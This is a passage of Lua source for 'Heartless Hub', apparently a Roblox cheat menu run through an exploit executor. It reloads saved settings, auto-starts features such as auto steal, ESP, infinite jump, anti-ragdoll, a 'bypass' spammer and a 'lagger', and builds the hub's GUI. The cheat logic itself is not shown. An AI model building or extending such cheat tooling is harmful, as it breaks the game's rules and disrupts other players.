    if type(d.bodyLockRange)=="number" and d.bodyLockRange>0 then bodyLockRange=d.bodyLockRange end
    if bodyLockEnabled then task.defer(function() if startBodyLock then pcall(startBodyLock) end end) end
    if type(d.autoResetOnDieEnabled)=="boolean" then autoResetOnDieEnabled=d.autoResetOnDieEnabled end
    if type(d.autoResetOnMedusaEnabled)=="boolean" then autoResetOnMedusaEnabled=d.autoResetOnMedusaEnabled end
    if autoResetOnDieEnabled and LP.Character and setupAutoResetOnDie then task.defer(function() pcall(setupAutoResetOnDie, LP.Character) end) end
    if autoResetOnMedusaEnabled and LP.Character and setupMedusa then task.defer(function() pcall(setupMedusa, LP.Character) end) end
    if type(d.introSoundId)=="string" then
        introSoundId=d.introSoundId
        if introSoundId ~= "" then INTRO_SOUND_ASSET_ID = "rbxassetid://" .. tostring(introSoundId):gsub("rbxassetid://","") end
    end
    if type(d.introSoundId)=="string" then introSoundId=d.introSoundId end

    if createStealBar then pcall(createStealBar) elseif applyStealBarPosition then pcall(applyStealBarPosition) end
    task.defer(function() pcall(applyThemeBackground) end)

    local function restoreKeyBinding(saved, target)
        if type(saved)~="table" then return end
        target.kb = type(saved.kb)=="string" and Enum.KeyCode[saved.kb] or nil
        target.gp = type(saved.gp)=="string" and Enum.UserInputType[saved.gp] or nil
    end
    restoreKeyBinding(d.dropBrainrotKey, KB.DropBrainrot)
    restoreKeyBinding(d.autoLeftKey, KB.AutoLeft)
    restoreKeyBinding(d.autoRightKey, KB.AutoRight)
    restoreKeyBinding(d.autoBatKey, KB.AutoBat)
    restoreKeyBinding(d.laggerToggleKey, KB.LaggerToggle)
    restoreKeyBinding(d.tpFloorKey, KB.TPFloor)
    restoreKeyBinding(d.guiHideKey, KB.GuiHide)
    restoreKeyBinding(d.speedToggleKey, KB.SpeedToggle)
    if KB.TPBat then restoreKeyBinding(d.tpBatKey, KB.TPBat) end
end)

pcall(function()
    if animEnabled then
        task.spawn(function()
            task.wait(1)
            if startAnimToggle then startAnimToggle() end
        end)
    end
    if headlessEnabled then
        task.spawn(function()
            task.wait(1)
            local ok, err = setHeadlessAppearance(true)
            if not ok then warn("Headless failed while loading config: " .. tostring(err)) end
        end)
    end
    if bodyColorMode and bodyColorMode ~= "Normal" then
        task.spawn(function()
            task.wait(1.2)
            pcall(function() setBodyColorMode(bodyColorMode) end)
            if korbloxEnabled then pcall(function() setKorbloxAppearance(true) end) end
        end)
    end
    -- bodylock/resets from config
    if korbloxEnabled then
        task.spawn(function()
            task.wait(1)
            local ok, err = setKorbloxAppearance(true)
            if not ok then warn("Korblox failed while loading config: " .. tostring(err)) end
        end)
    end
    if blueEspEnabled then startBlueESP() end
    if speedEspEnabled then startSpeedESP() end
    if mirrorTPDownEnabled then setMirrorTPDown(true) end
    if bypassEnabled then
        task.defer(function()
            task.wait(2.0)
            if startOceanBypass then
                pcall(startOceanBypass) -- opens GUI only; spam stays OFF until user presses ON
            end
        end)
    end
    if laggerPanelEnabled then
        task.defer(function()
            task.wait(2.2)
            if laggerPanelEnabled and startOceanLagger then
                pcall(startOceanLagger)
            end
        end)
    end
    task.spawn(function()
        while true do
            task.wait(8)
            if not bypassEnabled then
                -- nothing
            else
                local alive = false
                pcall(function()
                    if _obGui and _obGui.Parent then alive = true end
                end)
                if not alive then
                    pcall(function()
                        local roots = {}
                        pcall(function() if gethui then table.insert(roots, gethui()) end end)
                        pcall(function()
                            local lp = game:GetService("Players").LocalPlayer
                            if lp then table.insert(roots, lp:FindFirstChild("PlayerGui")) end
                        end)
                        pcall(function() table.insert(roots, game:GetService("CoreGui")) end)
                        for _, r in ipairs(roots) do
                            if r and r:FindFirstChild("Ocean Bypass") then alive = true break end
                        end
                    end)
                end
                if not alive and bypassEnabled and startOceanBypass then
                    pcall(startOceanBypass)
                end
            end
        end
    end)
    if antiLagEnabled then
        task.spawn(function()
            task.wait(1)
            if enableAntiLag then enableAntiLag() end
        end)
    end
    if stretchRezEnabled then
        task.spawn(function()
            task.wait(0.5)
            if enableStretchRez then enableStretchRez() end
        end)
    end
    if antiDieEnabled then
        task.delay(1, function() pcall(startAntiDie) end)
    end
    if antiRagdollEnabled then
        task.spawn(function()
            task.wait(0.5)
            if startAntiRagdoll then startAntiRagdoll() end
        end)
    end
    if infJumpEnabled then
        task.spawn(function()
            task.wait(0.5)
            startHoldInfJump()
        end)
    end
    if Steal.AutoStealEnabled then
        task.spawn(function()
            task.wait(1)
            if startAutoSteal then startAutoSteal() end
        end)
    end
    if batCounterEnabled then
        task.spawn(function()
            task.wait(1)
            if startBatCounter then startBatCounter() end
        end)
    end
    if medusaCounterEnabled then
        task.spawn(function()
            task.wait(0.5)
            local char = LP.Character
            if char then
                if setupMedusa then setupMedusa(char) end
                if setupRagdollTriggers then setupRagdollTriggers() end
            end
        end)
    end
    if autoTPEnabled then
        task.spawn(function()
            task.wait(0.5)
            if startAutoTP then startAutoTP() end
        end)
    end
    if currentSkyTheme and currentSkyTheme ~= "" then
        task.spawn(function()
            task.wait(1)
            if CandyApplyCustomSky then CandyApplyCustomSky(currentSkyTheme) end
        end)
    end
    if TPBat.enabled then
        task.spawn(function()
            task.wait(1)
            TPBat.start()
        end)
    end
    if autoLeftEnabled then
        task.spawn(function()
            task.wait(1)
            startAutoLeft()
        end)
    elseif autoRightEnabled then
        task.spawn(function()
            task.wait(1)
            startAutoRight()
        end)
    elseif autoBatEnabled then
        task.spawn(function()
            task.wait(1)
            queueAutoBatStart()
        end)
    end
    if unwalkEnabled then
        task.spawn(function()
            task.wait(0.75)
            startUnwalk()
        end)
    end

    -- Re-hook medusa counter after config
    task.spawn(function()
        task.wait(0.6)
        local char = LP.Character
        if medusaCounterEnabled and char then
            pcall(function() if setupMedusa then setupMedusa(char) end end)
            pcall(function() if setupRagdollTriggers then setupRagdollTriggers() end end)
        end
    end)

    _configFullyLoaded = true
end)

;(function()
    local PlayerGui = LP:WaitForChild("PlayerGui")

    local function makeDraggable(dragTarget, moveTarget)
        moveTarget = moveTarget or dragTarget
        local dragging, dragInput, dragStart, startPos = false
        dragTarget.InputBegan:Connect(function(input)
            if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
                dragging=true; dragStart=input.Position; startPos=moveTarget.Position
                input.Changed:Connect(function() if input.UserInputState==Enum.UserInputState.End then dragging=false end end)
            end
        end)
        dragTarget.InputChanged:Connect(function(input)
            if input.UserInputType==Enum.UserInputType.MouseMovement or input.UserInputType==Enum.UserInputType.Touch then dragInput=input end
        end)
        UIS.InputChanged:Connect(function(input)
            if input==dragInput and dragging then
                local delta=input.Position-dragStart
                moveTarget.Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+delta.X,startPos.Y.Scale,startPos.Y.Offset+delta.Y)
            end
        end)
    end

    local function new(class, props, children)
        local o = Instance.new(class)
        for k,v in pairs(props or {}) do o[k] = v end
        for _,c in ipairs(children or {}) do c.Parent = o end
        return o
    end
    local function corner(r) return new("UICorner",{CornerRadius=UDim.new(0,r)}) end
    local function stroke(c,t,trans)
        return new("UIStroke",{Color=c or Color3.fromRGB(60,60,60),Thickness=t or 1,Transparency=trans or 0.3,ApplyStrokeMode=Enum.ApplyStrokeMode.Border})
    end

    local LAVA_COLORS = {
        Color3.fromRGB(255, 214, 0),
        Color3.fromRGB(8, 8, 8),
        Color3.fromRGB(140, 140, 140),
        Color3.fromRGB(255, 255, 255),
    }
    local function lavaLerp(c1, c2, a)
        return Color3.new(c1.R + (c2.R - c1.R) * a, c1.G + (c2.G - c1.G) * a, c1.B + (c2.B - c1.B) * a)
    end
    local function lavaLampSequence(t)
        local p = (math.sin(t * 0.5) * 0.5 + 0.5)
        local yb = lavaLerp(LAVA_COLORS[1], LAVA_COLORS[2], p)
        local gw = lavaLerp(LAVA_COLORS[3], LAVA_COLORS[4], p)
        return ColorSequence.new({
            ColorSequenceKeypoint.new(0, LAVA_COLORS[1]),
            ColorSequenceKeypoint.new(0.25, yb),
            ColorSequenceKeypoint.new(0.5, LAVA_COLORS[2]),
            ColorSequenceKeypoint.new(0.75, gw),
            ColorSequenceKeypoint.new(1, LAVA_COLORS[4]),
        })
    end
    local function lavaLampSolid(t)
        local cycle = (t * 0.25) % 4
        local i = math.floor(cycle) + 1
        local nextI = (i % 4) + 1
        local a = cycle % 1
        return lavaLerp(LAVA_COLORS[i], LAVA_COLORS[nextI], a)
    end

    local ACCENT = ACCENT_COLOR
    local onAccent = registerAccentHook
    local accentTextColor = accentTextColor3
    local applyUITheme
    _G._lavaGradientTargets, _G._lavaSolidTargets = _G._lavaGradientTargets or {}, _G._lavaSolidTargets or {}
    function registerLavaGradient(gradientInst, animateRotation)
        table.insert(_G._lavaGradientTargets, {inst = gradientInst, rot = animateRotation})
    end
    function registerLavaSolid(inst, prop)
        table.insert(_G._lavaSolidTargets, {inst = inst, prop = prop})
    end
    task.spawn(function()
        local t = 0
        while true do
            t = t + 0.06
            local guiOpen = LP:FindFirstChild("PlayerGui") and LP.PlayerGui:FindFirstChild("HeartlessHubUI")
            if guiOpen then
                local seq = lavaLampSequence(t)
                local solid = lavaLampSolid(t)
                for _, g in ipairs(_G._lavaGradientTargets) do
                    if g.inst and g.inst.Parent then
                        pcall(function()
                            g.inst.Color = seq
                            if g.rot then g.inst.Rotation = math.sin(t * 0.35) * 45 end
                        end)
                    end
                end
                for _, sTarget in ipairs(_G._lavaSolidTargets) do
                    if sTarget.inst then
                        pcall(function() sTarget.inst[sTarget.prop] = solid end)
                    end
                end
            end
            task.wait(0.06)
        end
    end)

    applyUITheme = function(idx)
        idx = math.clamp(idx or 1, 1, #UI_THEMES)
        uiThemeIndex = idx
        ACCENT_COLOR = UI_THEMES[idx].accent
        ACCENT = ACCENT_COLOR
        LAVA_COLORS[1] = ACCENT_COLOR
        fireAccentHooks()
        pcall(function() if syncBypassTheme then syncBypassTheme() end end)
        if refreshESPColors then pcall(refreshESPColors) end
        pcall(function()
            if type(tabIndicators) == "table" then
                for _, ind in pairs(tabIndicators) do
                    if ind and ind.Parent then ind.BackgroundColor3 = ACCENT_COLOR end
                end
            end
            if type(tabButtons) == "table" and current and tabButtons[current] then
                tabButtons[current].TextColor3 = accentTextColor(ACCENT_COLOR)
            end
        end)
        if themeBgFrame then
            applyThemeBackground()
            themeBgFrame.Visible = true
            themeBgFrame.ImageTransparency = 0.12
        end
    end
    applyUITheme(uiThemeIndex)

    local pgRoot = LP:FindFirstChild("PlayerGui") or LP:WaitForChild("PlayerGui", 10)
    local existing = pgRoot and pgRoot:FindFirstChild("HeartlessHubUI")
    if existing then existing:Destroy() end

    _GuiKeys = {}
    local gui = Instance.new("ScreenGui")
    gui.Name = "HeartlessHubUI"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    parentGui(gui)

    local main = new("Frame",{
        Name="Main",
        Parent=gui,
        Size=((uiLayoutMode or 1) == 3) and UDim2.fromOffset(410,560) or UDim2.fromOffset(420,580),
        Position=(guiPositionsSaved and UDim2.new(hubPosSX or 0.5, hubPosOX or -210, hubPosSY or 0.5, hubPosOY or -290)) or UDim2.new(0.5,-210,0.5,-290),
        BackgroundColor3=Color3.fromRGB(0,0,0),
        BackgroundTransparency=0,
        BorderSizePixel=0,
        Active=true,
        ClipsDescendants=true,
    },{corner(28)})
    _hubMainRef = main
    pcall(applyHubPosition)
    local mainLavaStroke = stroke(ACCENT_COLOR, 2.2, 0.1)
    mainLavaStroke.Parent = main
    registerAccentHook(function(a) mainLavaStroke.Color = a end, mainLavaStroke)
    local mainStrokeGrad = Instance.new("UIGradient", mainLavaStroke)
    mainStrokeGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255,255,255)),
        ColorSequenceKeypoint.new(0.25, ACCENT_COLOR),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,255,255)),
        ColorSequenceKeypoint.new(0.75, ACCENT_COLOR),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255,255,255)),
    })
    task.spawn(function()
        local t = 0
        while mainStrokeGrad and mainStrokeGrad.Parent do
            t = t + 0.035
            local p = (math.sin(t) * 0.5 + 0.5)
            mainStrokeGrad.Offset = Vector2.new((p - 0.5) * 0.85, 0)
            task.wait(0.03)
        end
    end)

    local mainReopenBtn = new("TextButton",{
        Parent=gui,
        Name="MainReopen",
        Size=UDim2.new(0,110,0,28),
        Position=UDim2.new(0.5,-55,0,110),
        BackgroundColor3=Color3.fromRGB(15,15,15),
        BackgroundTransparency=0.1,
        Text=".gg/heartless",
        Font=Enum.Font.GothamBold,
        TextSize=11,
        TextColor3=Color3.fromRGB(255,255,255),
        AutoButtonColor=false,
        BorderSizePixel=0,
        ZIndex=100,
        Visible=false,
    },{corner(8), stroke(Color3.fromRGB(45,45,45),1,0.2)})

    makeDraggable(mainReopenBtn, mainReopenBtn)

    makeDraggable(main, main)

    local initImgId = (customBgId ~= "" and customBgId) or ""
    local themeBg_inst = new("ImageLabel",{
        Parent=main,
        Size=UDim2.fromScale(1,1),
        BackgroundTransparency=1,
        Image=(initImgId ~= "" and ("rbxthumb://type=Asset&id=" .. tostring(initImgId):gsub("%D","") .. "&w=420&h=420") or ""),
        ScaleType=Enum.ScaleType.Crop,
        ImageTransparency=(initImgId ~= "" and 0.12 or 1),
        Visible=(initImgId ~= ""),
        ZIndex=0,
        Active=false,
    },{corner(14)})
    themeBgFrame = themeBg_inst  -- exposed to applyUITheme
    task.defer(function()
        pcall(applyThemeBackground)
    end)

    local uiScale = Instance.new("UIScale")
    uiScale.Parent = main
    uiScale.Scale = uiScaleValue
    local function setUIScale(scale)
        scale = math.clamp(scale, 0.45, 1.5)
        uiScaleValue = scale
        uiScale.Scale = scale
    end

    local function fitGuiToScreen()
        local cam = workspace.CurrentCamera
        local vp = (cam and cam.ViewportSize) or Vector2.new(1280, 720)
        local baseW, baseH = 390, 560
        local padX, padY = 12, 24
        local maxW = math.max(200, vp.X - padX * 2)
        local maxH = math.max(260, vp.Y - padY * 2)
        local fit = math.min(maxW / baseW, maxH / baseH)
        fit = math.clamp(fit, 0.45, 1)
        if UIS.TouchEnabled then
            if uiScaleValue >= 0.98 and uiScaleValue <= 1.02 then
                setUIScale(math.clamp(fit * 0.96, 0.5, 0.92))
            else
                setUIScale(math.min(uiScaleValue, fit))
            end
            if not guiPositionsSaved then
                main.Position = UDim2.new(0.5, -195, 0.5, -280)
            else
                pcall(applyHubPosition)
            end
            mainReopenBtn.Size = UDim2.new(0, 130, 0, 36)
            mainReopenBtn.TextSize = 13
        else
            if fit < 1 and uiScaleValue > fit then
                setUIScale(math.max(fit, 0.55))
            end
        end
    end
    task.defer(fitGuiToScreen)
    pcall(function()
        workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
            task.defer(fitGuiToScreen)
        end)
        if workspace.CurrentCamera then
            workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(function()
                task.defer(fitGuiToScreen)
            end)
        end
    end)

    local header = new("Frame",{
        Parent=main,
        Size=UDim2.new(1,0,0,230),
        BackgroundTransparency=1,
        BorderSizePixel=0,
        ClipsDescendants=true,
    })
    new("Frame",{
        Parent=header,
        Size=UDim2.new(1,-32,0,1),
        Position=UDim2.new(0,16,1,-1),
        BackgroundColor3=Color3.fromRGB(255,255,255),
        BackgroundTransparency=0.85,
        BorderSizePixel=0,
    })
    local titleGrad = new("UIGradient",{Rotation=0})
    local hubTitleLbl = new("TextLabel",{
        Parent=header,
        Name="HubTitle",
        Size=UDim2.new(1,-60,0,40),
        Position=UDim2.fromOffset(16,20),
        BackgroundTransparency=1,
        Text="Heartless Hub",
        Font=Enum.Font.GothamBlack,
        TextSize=24,
        TextColor3=Color3.fromRGB(255,255,255),
        TextXAlignment=Enum.TextXAlignment.Left,
        ZIndex=2,
    },{titleGrad})
    registerLavaGradient(titleGrad, true)
    local hubSubLbl = new("TextLabel",{
        Parent=header,
        Name="HubSub",
        Size=UDim2.new(1,-60,0,18),
        Position=UDim2.fromOffset(16,58),
        BackgroundTransparency=1,
        Text=".gg/heartless",
        Font=Enum.Font.GothamMedium,
        TextSize=11,
        TextColor3=Color3.fromRGB(150,150,150),
        TextXAlignment=Enum.TextXAlignment.Left,
        ZIndex=2,
    })
    local headerDividerGrad = new("UIGradient",{
        Transparency=NumberSequence.new({
            NumberSequenceKeypoint.new(0,1),
            NumberSequenceKeypoint.new(0.18,0.25),
            NumberSequenceKeypoint.new(0.5,0.25),
            NumberSequenceKeypoint.new(0.82,0.25),
            NumberSequenceKeypoint.new(1,1),
        }),
        Rotation=0,
    })
    new("Frame",{
        Parent=header,
        Size=UDim2.new(1,-32,0,1),
        Position=UDim2.new(0,16,0,92),
        BackgroundColor3=Color3.fromRGB(255,255,255),
        BackgroundTransparency=0.55,
        BorderSizePixel=0,
    },{headerDividerGrad})
    registerLavaGradient(headerDividerGrad, false)

    local closeBtn = new("TextButton",{
        Parent=main,
        Name="OceanCloseBtn",
        Size=UDim2.fromOffset(26,26),
        Position=UDim2.new(1,-34,0,10),
        BackgroundColor3=Color3.fromRGB(20,20,20),
        BackgroundTransparency=0,
        Text="×",
        Font=Enum.Font.GothamBold,
        TextSize=16,
        TextColor3=Color3.fromRGB(255,255,255),
        AutoButtonColor=false,
        ZIndex=200,
    },{
        new("UICorner",{CornerRadius=UDim.new(0,13)}),
        new("UIStroke",{Color=Color3.fromRGB(50,50,50),Thickness=1,Transparency=0.2}),
    })
    _oceanCloseBtn = closeBtn
    local function headerBtnHover(b)
        b.MouseEnter:Connect(function() TweenService:Create(b,TweenInfo.new(0.12),{BackgroundColor3=Color3.fromRGB(35,35,35)}):Play() end)
        b.MouseLeave:Connect(function() TweenService:Create(b,TweenInfo.new(0.18),{BackgroundColor3=Color3.fromRGB(20,20,20)}):Play() end)
    end
    headerBtnHover(closeBtn)
    closeBtn.MouseButton1Click:Connect(function()

        mainReopenBtn.Position = main.Position
        mainReopenBtn.Visible = true
        main.Visible = false
    end)

    mainReopenBtn.MouseButton1Click:Connect(function()
        main.Visible = true
        mainReopenBtn.Visible = false
    end)

    local body = new("ScrollingFrame",{
        Parent=main,
        Position=((uiLayoutMode or 1) == 3) and UDim2.fromOffset(16,88) or UDim2.fromOffset(78,100),
        Size=((uiLayoutMode or 1) == 3) and UDim2.new(1,-32,1,-140) or UDim2.new(1,-176,1,-118),
        BackgroundTransparency=1,
        BorderSizePixel=0,
        ScrollBarThickness=3,
        ScrollBarImageColor3=ACCENT,
        CanvasSize=UDim2.new(),
        AutomaticCanvasSize=Enum.AutomaticSize.Y,
    },{
        new("UIPadding",{PaddingLeft=UDim.new(0,12),PaddingRight=UDim.new(0,12),PaddingTop=UDim.new(0,14),PaddingBottom=UDim.new(0,16)}),
        new("UIListLayout",{Padding=UDim.new(0,10),SortOrder=Enum.SortOrder.LayoutOrder}),
    })
    onAccent(function(a) body.ScrollBarImageColor3 = a end)

    local function sectionLabel(text)
        local holder = new("Frame",{
            Size=UDim2.new(1,0,0,20),
            BackgroundTransparency=1,
            BorderSizePixel=0,
        })
        local tick = new("Frame",{
            Parent=holder,
            Size=UDim2.fromOffset(3,10),
            Position=UDim2.new(0,0,0.5,-5),
            BackgroundColor3=ACCENT,
            BorderSizePixel=0,
        },{corner(2)})
        onAccent(function(a) tick.BackgroundColor3 = a end, tick)
        new("TextLabel",{
            Parent=holder,
            Size=UDim2.new(1,-10,1,0),
            Position=UDim2.fromOffset(10,0),
            BackgroundTransparency=1,
            Text=string.upper(text),
            Font=Enum.Font.GothamBold,
            TextSize=10,
            TextColor3=Color3.fromRGB(200,200,200),
            TextXAlignment=Enum.TextXAlignment.Left,
        })
        return holder
    end

    local function row(height)
        local r = new("Frame",{
            Size=UDim2.new(1,0,0,height or 42),
            BackgroundColor3=Color3.fromRGB(18,20,26),
            BackgroundTransparency=0,
            BorderSizePixel=0,
        },{corner(4)})
        local edge = new("Frame",{
            Parent=r,
            Size=UDim2.new(0,3,1,0),
            Position=UDim2.fromOffset(0,0),
            BackgroundColor3=ACCENT,
            BackgroundTransparency=0.55,
            BorderSizePixel=0,
        })
        onAccent(function(a) edge.BackgroundColor3 = a end, edge)
        r.MouseEnter:Connect(function()
            TweenService:Create(r, TweenInfo.new(0.12), {BackgroundColor3=Color3.fromRGB(24,28,36)}):Play()
            TweenService:Create(edge, TweenInfo.new(0.12), {BackgroundTransparency=0.15}):Play()
        end)
        r.MouseLeave:Connect(function()
            TweenService:Create(r, TweenInfo.new(0.16), {BackgroundColor3=Color3.fromRGB(18,20,26)}):Play()
            TweenService:Create(edge, TweenInfo.new(0.16), {BackgroundTransparency=0.55}):Play()
        end)
        return r
    end

    local function makeSlider(name, min, max, default, callback)
        local mode = uiLayoutMode or 1
        local style3 = mode >= 3
        local style4 = mode == 4
        local value = math.clamp(tonumber(default) or min, min, max)

        if style4 then
            local r = new("Frame",{
                Size=UDim2.new(1,0,0,58),
                BackgroundColor3=Color3.fromRGB(9,11,18),
                BorderSizePixel=0,
            },{corner(16)})
            local ring = stroke(ACCENT, 1.4, 0.4)
            ring.Parent = r
            onAccent(function(a) ring.Color = a end, r)
            local glow = new("Frame",{
                Parent=r, Size=UDim2.new(0,3,1,-12), Position=UDim2.fromOffset(8,6),
                BackgroundColor3=ACCENT, BorderSizePixel=0,
            },{corner(2)})
            onAccent(function(a) glow.BackgroundColor3 = a end, glow)
            new("TextLabel",{
                Parent=r, Size=UDim2.new(0.5,-20,0,14), Position=UDim2.fromOffset(18,8),
                BackgroundTransparency=1, Text=string.upper(tostring(name)),
                Font=Enum.Font.GothamBold, TextSize=10,
                TextColor3=Color3.fromRGB(130,140,160), TextXAlignment=Enum.TextXAlignment.Left,
            })
            local valBox = new("TextBox",{
                Parent=r, Size=UDim2.new(0.48,-12,0,28), Position=UDim2.new(0.5,0,0,22),
                BackgroundColor3=Color3.fromRGB(6,8,14), Text=tostring(value),
                Font=Enum.Font.GothamBlack, TextSize=18, TextColor3=ACCENT,
                TextXAlignment=Enum.TextXAlignment.Center, ClearTextOnFocus=true, BorderSizePixel=0,
            },{corner(10), stroke(ACCENT,1.2,0.35)})
            onAccent(function(a)
                valBox.TextColor3 = a
                local s = valBox:FindFirstChildOfClass("UIStroke")
                if s then s.Color = a end
            end, valBox)
            new("TextLabel",{
                Parent=r, Size=UDim2.new(0.48,-12,0,12), Position=UDim2.fromOffset(18,36),
                BackgroundTransparency=1, Text="tap to edit",
                Font=Enum.Font.Gotham, TextSize=9,
                TextColor3=Color3.fromRGB(90,95,110), TextXAlignment=Enum.TextXAlignment.Left,
            })
            local function commit(n)
                n = math.clamp(tonumber(n) or value, min, max)
                n = math.floor(n * 10 + 0.5) / 10
                value = n
                valBox.Text = (n == math.floor(n)) and tostring(math.floor(n)) or string.format("%.1f", n)
                if callback then callback(n) end
            end
            valBox.FocusLost:Connect(function() commit(valBox.Text) end)
            r.MouseEnter:Connect(function()
                TweenService:Create(r, TweenInfo.new(0.14), {BackgroundColor3=Color3.fromRGB(14,17,26)}):Play()
                TweenService:Create(ring, TweenInfo.new(0.14), {Transparency=0.15}):Play()
            end)
            r.MouseLeave:Connect(function()
                TweenService:Create(r, TweenInfo.new(0.18), {BackgroundColor3=Color3.fromRGB(9,11,18)}):Play()
                TweenService:Create(ring, TweenInfo.new(0.18), {Transparency=0.4}):Play()
            end)
            return r
        elseif style3 then
            local r = new("Frame",{
                Size=UDim2.new(1,0,0,52),
                BackgroundColor3=Color3.fromRGB(11,13,20),
                BorderSizePixel=0,
            },{corner(14)})
            local ring = stroke(ACCENT, 1.2, 0.5)
            ring.Parent = r
            onAccent(function(a) ring.Color = a end, r)
            new("TextLabel",{
                Parent=r, Size=UDim2.new(0.55,-8,1,0), Position=UDim2.fromOffset(14,0),
                BackgroundTransparency=1, Text=tostring(name),
                Font=Enum.Font.GothamBold, TextSize=12,
                TextColor3=Color3.fromRGB(200,205,220), TextXAlignment=Enum.TextXAlignment.Left,
            })
            local valBox = new("TextBox",{
                Parent=r, Size=UDim2.new(0.4,-10,0,30), Position=UDim2.new(0.6,0,0.5,-15),
                BackgroundColor3=Color3.fromRGB(8,10,16), Text=tostring(value),
                Font=Enum.Font.GothamBlack, TextSize=15, TextColor3=ACCENT,
                TextXAlignment=Enum.TextXAlignment.Center, ClearTextOnFocus=true, BorderSizePixel=0,
            },{corner(9), stroke(ACCENT,1,0.5)})
            onAccent(function(a)
                valBox.TextColor3 = a
                local s = valBox:FindFirstChildOfClass("UIStroke")
                if s then s.Color = a end
            end, valBox)
            local function commit(n)
                n = math.clamp(tonumber(n) or value, min, max)
                n = math.floor(n * 10 + 0.5) / 10
                value = n
                valBox.Text = (n == math.floor(n)) and tostring(math.floor(n)) or string.format("%.1f", n)
                if callback then callback(n) end
            end
            valBox.FocusLost:Connect(function() commit(valBox.Text) end)
            r.MouseEnter:Connect(function()
                TweenService:Create(r, TweenInfo.new(0.12), {BackgroundColor3=Color3.fromRGB(16,18,28)}):Play()
            end)
            r.MouseLeave:Connect(function()
                TweenService:Create(r, TweenInfo.new(0.16), {BackgroundColor3=Color3.fromRGB(11,13,20)}):Play()
            end)
            return r
        end

        local r = row(42)
        new("TextLabel",{Parent=r,Size=UDim2.new(1,-80,1,0),Position=UDim2.fromOffset(14,0),BackgroundTransparency=1,
            Text=name,Font=Enum.Font.GothamMedium,TextSize=13,TextColor3=Color3.fromRGB(235,235,235),TextXAlignment=Enum.TextXAlignment.Left})
        local valBox = new("TextBox",{Parent=r,Size=UDim2.fromOffset(54,24),Position=UDim2.new(1,-62,0.5,-12),
            BackgroundColor3=Color3.fromRGB(10,12,16),Text=tostring(default),Font=Enum.Font.GothamBold,TextSize=12,
            TextColor3=ACCENT,TextXAlignment=Enum.TextXAlignment.Center,
            ClearTextOnFocus=true,BorderSizePixel=0},{corner(4), stroke(Color3.fromRGB(40,50,60),1,0.35)})
        onAccent(function(a) valBox.TextColor3 = a end, valBox)
        valBox.FocusLost:Connect(function()
            local n = tonumber(valBox.Text)
            if n then
                n = math.clamp(n, min, max)
                n = math.floor(n * 10 + 0.5) / 10
                valBox.Text = (n == math.floor(n)) and tostring(math.floor(n)) or string.format("%.1f", n)
                if callback then callback(n) end
            else
                valBox.Text = tostring(default)
            end
        end)
        return r
    end

    local listeningBtn = nil
    -- Each key holds every function assigned to it, so duplicate keybinds are allowed.
    local keybindMap = {}
    local function prettyKey(kc)
        local map = {
            ButtonA = "A", ButtonB = "B", ButtonX = "X", ButtonY = "Y",
            ButtonR1 = "RB", ButtonR2 = "RT", ButtonL1 = "LB", ButtonL2 = "LT",
            DPadUp = "D↑", DPadDown = "D↓", DPadLeft = "D←", DPadRight = "D→",
            ButtonStart = "▶", ButtonSelect = "◀",
            LeftShift = "LShift", RightShift = "RShift", LeftControl = "LCtrl", RightControl = "RCtrl",
            LeftAlt = "LAlt", RightAlt = "RAlt", LeftSuper = "LSuper", RightSuper = "RSuper",
            Return = "Enter", BackSpace = "Backspace", Tab = "Tab", CapsLock = "CapsLock",
            Escape = "Esc", Space = "Space", PageUp = "PgUp", PageDown = "PgDn",
            End = "End", Home = "Home", Insert = "Ins", Delete = "Del",
            Up = "↑", Down = "↓", Left = "←", Right = "→",
            F1 = "F1", F2 = "F2", F3 = "F3", F4 = "F4", F5 = "F5", F6 = "F6",
            F7 = "F7", F8 = "F8", F9 = "F9", F10 = "F10", F11 = "F11", F12 = "F12",
            Print = "PrtScn", ScrollLock = "ScrLk", Pause = "Pause",
            Minus = "-", Equals = "=", LeftBracket = "[", RightBracket = "]",
            BackSlash = "\\", Semicolon = ";", Quote = "'",
            Comma = ",", Period = ".", Slash = "/", Backquote = "`",
            ButtonL3 = "L3", ButtonR3 = "R3",
        }
        if not kc then return "?" end
        return map[kc.Name] or kc.Name
    end

    local function isGamepadInput(input)
        local t = input.UserInputType
        return t == Enum.UserInputType.Gamepad1
            or t == Enum.UserInputType.Gamepad2
            or t == Enum.UserInputType.Gamepad3
            or t == Enum.UserInputType.Gamepad4
            or t == Enum.UserInputType.Gamepad5
            or t == Enum.UserInputType.Gamepad6
            or t == Enum.UserInputType.Gamepad7
            or t == Enum.UserInputType.Gamepad8
    end
    local function isBindableInput(input)
        return input.UserInputType == Enum.UserInputType.Keyboard or isGamepadInput(input)
    end

    UIS.InputBegan:Connect(function(input, gameProcessed)
        if not isBindableInput(input) then return end
        if input.KeyCode == Enum.KeyCode.Unknown then return end
        if (input.KeyCode == Enum.KeyCode.Escape or input.KeyCode == Enum.KeyCode.ButtonB) and listeningBtn then
            listeningBtn.btn.Text = listeningBtn.prev
            listeningBtn.btn.TextColor3 = Color3.fromRGB(220,220,220)
            listeningBtn = nil
            return
        end
        if listeningBtn then
            -- ignore pure thumbstick axis noise
            local n = input.KeyCode.Name
            if n == "Thumbstick1" or n == "Thumbstick2" then return end
            listeningBtn.onKey(input.KeyCode)
            listeningBtn = nil
            return
        end
        local callbacks = keybindMap[input.KeyCode]
        if callbacks then
            for _, cb in pairs(callbacks) do
                pcall(cb)
            end
        end
    end)

    local function startKeyListen(lbl, onSet)
        if listeningBtn then
            listeningBtn.btn.Text = listeningBtn.prev
            listeningBtn.btn.TextColor3 = Color3.fromRGB(220,220,220)
        end
        local prevText = lbl.Text
        listeningBtn = {
            btn = lbl,
            prev = prevText,
            onKey = function(kc)
                if onSet then onSet(kc) end
                lbl.Text = prettyKey(kc)
                lbl.TextColor3 = Color3.fromRGB(220,220,220)
            end
        }
        lbl.Text = "PAD/KEY.."
        lbl.TextColor3 = ACCENT
        task.delay(8, function()
            if listeningBtn and listeningBtn.btn == lbl then
                listeningBtn.btn.Text = listeningBtn.prev
